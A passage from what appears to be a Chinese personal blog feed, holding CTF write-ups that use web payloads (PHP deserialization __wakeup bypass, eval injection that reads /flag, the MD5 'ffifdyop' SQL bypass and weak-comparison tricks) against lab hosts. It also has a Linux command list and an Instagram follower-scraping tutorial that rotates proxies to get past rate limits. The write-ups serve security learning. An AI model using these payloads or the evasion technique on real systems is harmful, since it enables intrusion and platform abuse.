class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>unserialize()</code>结束时会自动调用__destruct()，当username&#x3D;admin且password&#x3D;100时，会显示flag。</p><p>构造序列化（对象-&gt;字符串）代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;100&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$select</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">serialize</span>(@<span class="hljs-variable">$select</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-comment"># @$select 表示选择变量$select的值，如果$select存在则取其值，否则返回空值。 </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：<br><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</code></p><ul><li>Nameusername 只有12个字符，这里的14怎么来的呢？  <ul><li>在PHP中，私有属性是无法从类外部直接访问的。为了在序列化字符串中表示这些属性，PHP会在私有属性名称的前面加上<code>\0</code>（空字符）。</li><li>在URL编码中，<code>\0</code>表示为 <code>%00</code>。</li></ul></li></ul><p>代码中__wakeup()会将username赋值为guest，所以要想办法绕过该函数。<br>**当成员属性数目大于实际数目时可以绕过__wakeup()。</p><p>payload改为：<br><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code><br>成功。</p><p><img src="/../images/Pasted%20image%2020240912131640.png"></p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>题目提示backup。<br>用dirsearch扫描网站目录。<br>&#96;python dirsearch.py -u <a href="http://ec12e063-d18b-4b87-af43-b460e376b09c.node5.buuoj.cn:81/">http://ec12e063-d18b-4b87-af43-b460e376b09c.node5.buuoj.cn:81/</a><br>扫描到&#x2F;index.php.bak可访问，内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php弱类型（两个&#x3D;）比较：<br>var_dump(‘a’ &#x3D;&#x3D; 0);&#x2F;&#x2F;bool(true)<br>var_dump(‘1a’ &#x3D;&#x3D; 1);&#x2F;&#x2F;bool(true)<br>var_dump(‘12a’ &#x3D;&#x3D; 1);&#x2F;&#x2F;bool(false)<br>如果字符串是以数字开头的，那么就会转成这个数字再做比较。</p><p>构造payload：</p><p><code>[ec12e063-d18b-4b87-af43-b460e376b09c.node5.buuoj.cn:81/?key=123](http://ec12e063-d18b-4b87-af43-b460e376b09c.node5.buuoj.cn:81/?key=123)</code></p><p><img src="/../images/Pasted%20image%2020240912141823.png"></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>查看源代码，发现calc.php，访问该文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);  <br>&#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$str </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];        <span class="hljs-variable">$blacklist </span>= [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];  <br>        <span class="hljs-keyword">foreach</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$blacklist as</span> <span class="hljs-variable">$blackitem</span>) &#123;  <br>                <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem </span>. <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;  <br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);  <br>                &#125;  <br>        &#125;  <br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现waf不允许变量传递字母。</p><p><img src="/../images/Pasted%20image%2020240913142222.png"></p><p><strong>PHP的字符串解析特性</strong>：<br>php从请求的url中取出参数并保存之前，1.删除空白符号 2.将一些特殊字符(包括空格)转换为下划线_</p><p>所以可以在num前加个空格，这样waf就找不到num这个变量了，因为现在变量是“ num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">`chr()` — 返回指定的字符<br>`scandir()` — 列出指定路径中的文件和目录<br>`var_dump()` — 打印变量的相关信息<br>`file_get_contents()` — 将整个文件读入一个字符串<br></code></pre></td></tr></table></figure><p>由于scandir(“&#x2F;“)能扫描根目录，但是过滤了”&#x2F;“，所以使用ASCII值绕过。</p><p><img src="/../images/Pasted%20image%2020240913145742.png"></p><p>发现flag文件，读取这个文件：<br><code>calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) </code><br><img src="/../images/Pasted%20image%2020240913151443.png"></p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><img src="/../images/Pasted%20image%2020240913152910.png"></p><p>burpsuite抓包：</p><p><img src="/../images/Pasted%20image%2020240913155835.png"></p><p>更改user：</p><p><img src="/../images/Pasted%20image%2020240913160239.png"></p><p>proxy中更改请求方式为post，发送到repeater。密码是弱类型比较。</p><p><img src="/../images/Pasted%20image%2020240913161016.png"></p><p>设置money:</p><p><img src="/../images/Pasted%20image%2020240913161550.png"><br>科学计数法绕过：<img src="/../images/Pasted%20image%2020240913162644.png"></p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>抓包。<br><img src="/../images/Pasted%20image%2020240918135410.png"></p><p><code>md5(string,raw)</code>:当存在参数true时，使用原始16字符二进制格式。</p><p>查阅其他wp，查找到<code>ffifdyop</code>字符串经过MD5哈希之后，会变成<code>276f722736c95d99e921722cf9ed621c</code>，MySQL数据库会把<code>HEX</code>转换成<code>ASCII</code>解释，所以这几个字符相当于：<code>&#39; or &#39;6xxxxxx</code>。</p><p>经过拼接形成：<br><code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxxx&#39;</code><br>等价于 or 一个永真式，相当于万能密码，因此可以绕过md5()函数。<br>输入<code>ffifdyop</code>后：</p><p><img src="/../images/Pasted%20image%2020240918161725.png"></p><p>查看源代码，发现注释内容：</p><figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>MD5弱碰撞，构造payload：<br><code>?a=QNKCDZO&amp;b=s878926199a</code></p><p><img src="/../images/Pasted%20image%2020240918163555.png"></p><p>MD5强碰撞，由于PHP中md5()函数不能处理数组，所以使用数组绕过比较，构造Payload：<br><code>param1[]=1&amp;param2[]=2</code></p><p><img src="/../images/Pasted%20image%2020240918170248.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;极客大挑战-2019-EasySQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]EasySQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]EasySQL&lt;/h1&gt;&lt;p&gt;首先随意</summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>linux命令</title>
    <link href="http://example.com/2024/09/03/linux%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2024/09/03/linux%E5%91%BD%E4%BB%A4/</id>
    <published>2024-09-03T06:11:48.000Z</published>
    <updated>2024-12-09T08:33:27.083Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">nohup python <span class="hljs-punctuation">-</span>u xxx.py &gt;xxx.<span class="hljs-built_in">log</span> <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1 &amp;</span><br><span class="hljs-meta"># 让服务器在后台运行</span><br><span class="hljs-meta"># 运行成功会输出一个PID号 </span><br><span class="hljs-meta"># 关闭运行程序： kill -9 PID</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -ef |<span class="hljs-keyword">grep</span> <span class="hljs-keyword">python</span><br># 查看当前<span class="hljs-keyword">python</span>相关进程<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> # 在输入安装命令前，记得先运行<span class="hljs-string">&quot;sudo apt update&quot;</span>来更新软件包列表<br>sudo su<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br>reboot<br><br></code></pre></td></tr></table></figure><figure class="highlight coffeescript"><table><tr><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> start<br><span class="hljs-built_in">npm</span> run deploy<br><br></code></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> remote <span class="hljs-keyword">add</span> origin http:<span class="hljs-comment">//.git</span><br><span class="hljs-symbol">git</span> <span class="hljs-keyword">add</span> .<br><span class="hljs-symbol">git</span> commit -m <span class="hljs-string">&quot;init&quot;</span><br><span class="hljs-symbol">git</span> <span class="hljs-keyword">push</span><br>查看当前配置：git remote -v<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> http<span class="hljs-selector-class">.proxy</span> http:<span class="hljs-comment">//192.168.1.10:7897</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">githacker</span> --url http://<span class="hljs-number">83</span>d9dee3-<span class="hljs-number">3</span>f90-<span class="hljs-number">4977</span>-<span class="hljs-number">9</span>cc5-<span class="hljs-number">99</span>d26b130a8b.node5.buuoj.cn:<span class="hljs-number">81</span>/.git --output-folder git<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight 1c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs 1c&quot;&gt;nohup python &lt;span class=&quot;hljs-punctuation&quot;&gt;-&lt;/span&gt;u xx</summary>
      
    
    
    
    
    <category term="记一些常用的命令" scheme="http://example.com/tags/%E8%AE%B0%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>爬虫：获取ins指定用户的粉丝数</title>
    <link href="http://example.com/2024/09/02/%E7%88%AC%E8%99%AB%EF%BC%9A%E8%8E%B7%E5%8F%96ins%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E7%B2%89%E4%B8%9D%E6%95%B0/"/>
    <id>http://example.com/2024/09/02/%E7%88%AC%E8%99%AB%EF%BC%9A%E8%8E%B7%E5%8F%96ins%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E7%B2%89%E4%B8%9D%E6%95%B0/</id>
    <published>2024-09-02T05:35:35.000Z</published>
    <updated>2024-12-09T08:32:46.466Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h1><h3 id="1-分析网页URL"><a href="#1-分析网页URL" class="headerlink" title="1.分析网页URL"></a>1.分析网页URL</h3><p> 浏览器F12进入开发者模式，点击Network—&gt;XHR或JS，或者burpsuite抓包，分析目标数据所在的真实URL。<br> <img src="/../images/Pasted%20image%2020240903150411.png"><br> <img src="/../images/Pasted%20image%2020240903150651.png"></p><h3 id="2-模拟请求网页数据"><a href="#2-模拟请求网页数据" class="headerlink" title="2.模拟请求网页数据"></a>2.模拟请求网页数据</h3><h4 id="2-1-HTTP-消息结构"><a href="#2-1-HTTP-消息结构" class="headerlink" title="2.1 HTTP 消息结构"></a>2.1 HTTP 消息结构</h4><p> HTTP 消息是客户端和服务器之间通信的基础，它们由一系列的文本行组成，遵循特定的格式和结构。<br> HTTP消息分为两种类型：请求消息和响应消息。</p><h5 id="2-1-1-客户端请求消息"><a href="#2-1-1-客户端请求消息" class="headerlink" title="2.1.1 客户端请求消息"></a>2.1.1 客户端请求消息</h5><p> <strong>请求行、请求头部、空行和请求数据</strong><br> 请求报文的一般格式：<br> <img src="/../images/Pasted%20image%2020240903153233.png"></p><ul><li><strong>请求行</strong><ul><li>请求方法：GET、POST、PUT、DELETE等。</li><li>请求URL：请求的资源路径，通常包括主机名、端口号（如果非默认）、路径和查询字符串。</li><li>HTTP 版本：如 HTTP&#x2F;1.1 或 HTTP&#x2F;2<br> 请求行的格式示例：<code>GET /index.html HTTP/1.1</code></li></ul></li><li><strong>请求头</strong><br>  在模拟请求时，如果不设置请求头，很容易被网站发现是爬虫脚本，从而对这种模拟请求进行拒绝。使用 <code>params</code> 关键字参数，以一个字符串字典来提供这些参数。<br>  <img src="/../images/Pasted%20image%2020240903154810.png"></li><li><strong>空行</strong><br>  请求头和请求体之间的分隔符，表示请求头的结束。</li><li><strong>请求体</strong>（可选）<br>  在某些类型的HTTP请求（如 POST 和 PUT）中，请求体包含要发送给服务器的数据。</li></ul><h5 id="2-1-2-服务器请求消息"><a href="#2-1-2-服务器请求消息" class="headerlink" title="2.1.2 服务器请求消息"></a>2.1.2 服务器请求消息</h5><p><strong>状态行、消息报头、空行和响应正文</strong><br><img src="/../images/Pasted%20image%2020240903155116.png"></p><ul><li><strong>状态行</strong><ul><li><strong>HTTP 版本</strong>：与请求消息中的版本相匹配。</li><li><strong>状态码</strong>：三位数，表示请求的处理结果。<ul><li><strong>1xx（信息性状态码）</strong>：表示接收的请求正在处理。</li><li><strong>2xx（成功状态码）</strong>：表示请求正常处理完毕。</li><li><strong>3xx（重定向状态码）</strong>：需要后续操作才能完成这一请求。</li><li><strong>4xx（客户端错误状态码）</strong>：表示请求包含语法错误或无法完成。</li><li><strong>5xx（服务器错误状态码）</strong>：服务器在处理请求的过程中发生了错误。</li></ul></li><li><strong>状态信息</strong>：状态码的简短描述。<br>  状态行的格式示例：<code>HTTP/1.1 200 OK</code></li></ul></li><li><strong>响应头</strong><ul><li>包含了服务器环境信息、响应体的大小、服务器支持的压缩类型等。</li></ul></li><li><strong>空行</strong><ul><li>响应头和响应体之间的分隔符，表示响应头的结束。</li></ul></li><li><strong>响应体</strong>（可选）<ul><li>包含服务器返回的数据，如请求的网页内容、图片、JSON数据等</li></ul></li></ul><h4 id="2-2-定制请求头"><a href="#2-2-定制请求头" class="headerlink" title="2.2 定制请求头"></a>2.2 定制请求头</h4><figure class="highlight swift"><table><tr><td class="code"><pre><code class="hljs swift">headers <span class="hljs-operator">=</span> &#123;<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;www.instagram.com&quot;</span>,<br>        <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>,<br>        <span class="hljs-string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="hljs-string">&quot;?0&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;sec-ch-ua-platform-version&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>12.2.1<span class="hljs-subst">\&quot;</span>&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;X-ASBD-ID&quot;</span>: <span class="hljs-string">&quot;129477&quot;</span>,<br>        <span class="hljs-string">&quot;X-CSRFToken&quot;</span>: <span class="hljs-string">&quot;aMFPLyFGuRw9PXGLAg8CXx&quot;</span>,<br>        <span class="hljs-string">&quot;X-IG-App-ID&quot;</span>: <span class="hljs-string">&quot;936619743392459&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: f<span class="hljs-string">&quot;https://www.instagram.com/&#123;sanitized_username&#125;/&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span><br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="3-获取数据"><a href="#3-获取数据" class="headerlink" title="3.获取数据"></a>3.获取数据</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><code class="hljs prolog">if <span class="hljs-string">&#x27;data&#x27;</span> in data and <span class="hljs-string">&#x27;user&#x27;</span> in data[<span class="hljs-string">&#x27;data&#x27;</span>] and <span class="hljs-string">&#x27;edge_followed_by&#x27;</span> in data[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>]:<br>    follower_count = data[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>][<span class="hljs-string">&#x27;edge_followed_by&#x27;</span>][<span class="hljs-string">&#x27;count&#x27;</span>]<br></code></pre></td></tr></table></figure><h1 id="过程中遇到的问题"><a href="#过程中遇到的问题" class="headerlink" title="过程中遇到的问题"></a>过程中遇到的问题</h1><h2 id="1-登录状态时，无法有效模拟请求"><a href="#1-登录状态时，无法有效模拟请求" class="headerlink" title="1.登录状态时，无法有效模拟请求"></a>1.登录状态时，无法有效模拟请求</h2><p>经大神指点，发现登录状态和不登录状态下用户粉丝数所在的URL不同，请求方法也不同。<br><img src="/../images/Pasted%20image%2020240903164507.png"><br><img src="/../images/Pasted%20image%2020240903164621.png"></p><p>因此选择退出登录，使用不登录状态下的请求URL。</p><h2 id="2-如何远程连接服务器"><a href="#2-如何远程连接服务器" class="headerlink" title="2.如何远程连接服务器"></a>2.如何远程连接服务器</h2><p>任务是获取100万个用户的粉丝数，在笔记本上跑代码效率太低，因此申请了一台服务器。之前只接触过用向日葵远程操控服务器，因此在搜索资料后，我只进行了远程服务器与pycharm的连接。后经大神指点，下载了Termius，远程操作方便又快捷。除此之外，通过nohup命令让服务器在后台运行，实现本机自由。</p><h2 id="3-Error：429"><a href="#3-Error：429" class="headerlink" title="3.Error：429"></a>3.Error：429</h2><p><img src="/../images/e820768b136e9e76f303c67101b5b34.png"><br>因此需要走代理。<br><img src="/../images/Pasted%20image%2020240903170424.png"><br>拿到以上代理，设置如下：<br><img src="/../images/Pasted%20image%2020240903170956.png"><br>HTTP&#x2F;HTTPS代理适用于网络请求，而SOCKS5代理支持更多协议和应用场景（如邮件、FTP等）<br>每次请求时，从代理池中随机选择一个代理服务器，使用相应的协议和认证信息发起请求。请求由代理服务器转发到目标服务器，目标服务器的响应再通过代理服务器返回给客户端。这种中转机制有效避免了IP被封禁，并且可以通过多次轮换代理来模拟多个客户端的行为。</p><h2 id="4-爬虫效率较低"><a href="#4-爬虫效率较低" class="headerlink" title="4.爬虫效率较低"></a>4.爬虫效率较低</h2><p>由于数据规模较大，要提升爬虫效率，可以使用多线程。典型的应用场景包括：</p><ul><li>I&#x2F;O密集型任务：如文件读写、网络通信等。</li><li>并发处理：同时处理多个用户请求。</li><li>异步编程：利用多线程进行非阻塞的异步操作。<br>Python的<code>threading</code>模块简化了多线程编程。以下是一个简单的多线程示例：<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">import threading<br>import time<br><br><span class="hljs-comment"># 定义一个简单的线程任务:每隔一秒打印当前线程的名字和计数器的值</span><br>def thread_task(): <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(5): <br>time.sleep(1) <br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;Thread &#123;threading.current_thread().name&#125;: Count &#123;i&#125;&quot;</span>) <br><br><span class="hljs-comment"># 创建两个线程 </span><br>thread1 = threading.Thread(<span class="hljs-attribute">target</span>=thread_task, <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;Thread-1&#x27;</span>) <br>thread2 = threading.Thread(<span class="hljs-attribute">target</span>=thread_task, <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;Thread-2&#x27;</span>) <br><br><span class="hljs-comment"># 启动线程 </span><br>thread1.start() <br>thread2.start() <br><br><span class="hljs-comment"># 等待线程结束 </span><br>thread1.join() <br>thread2.join()<br></code></pre></td></tr></table></figure>在多线程编程中，线程之间可能需要进行数据交换或通信。使用<code>queue</code>模块实现。<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 定义一个线程安全的队列 </span><br>shared_queue = queue.Queue()<br><br><span class="hljs-comment"># 定义生产者任务</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">producer</span>(): <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <br>shared_queue.put(i) <br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 定义消费者任务</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">consumer</span>(): <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>: <br>data = shared_queue.get() <br><span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: <br><span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Consumed: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 创建生产者和消费者线程 </span><br>producer_thread = threading.Thread(target=producer) <br>consumer_thread = threading.Thread(target=consumer)<br><br><span class="hljs-comment"># 启动线程 </span><br>producer_thread.start() consumer_thread.start() <br><br><span class="hljs-comment"># 等待生产者线程结束 </span><br>producer_thread.join() <br><br><span class="hljs-comment"># 在队列中放入结束标志，通知消费者线程结束 </span><br>shared_queue.put(<span class="hljs-literal">None</span>) <br><br><span class="hljs-comment"># 等待消费者线程结束 </span><br>consumer_thread.join()<br></code></pre></td></tr></table></figure>多线程编程需要注意线程安全性，防止多个线程同时修改共享数据。Python提供了一些线程安全的数据结构，如<code>queue</code>、<code>Lock</code>等，用于解决多线程并发访问共享资源的问题。</li></ul><h2 id="5-进程killed"><a href="#5-进程killed" class="headerlink" title="5.进程killed"></a>5.进程killed</h2><p>分析原因可能是该进程超出了资源限制，设置最大queue_size&#x3D;10000，强制队列大小保持在一定范围内。</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter<br><span class="hljs-keyword">from</span> 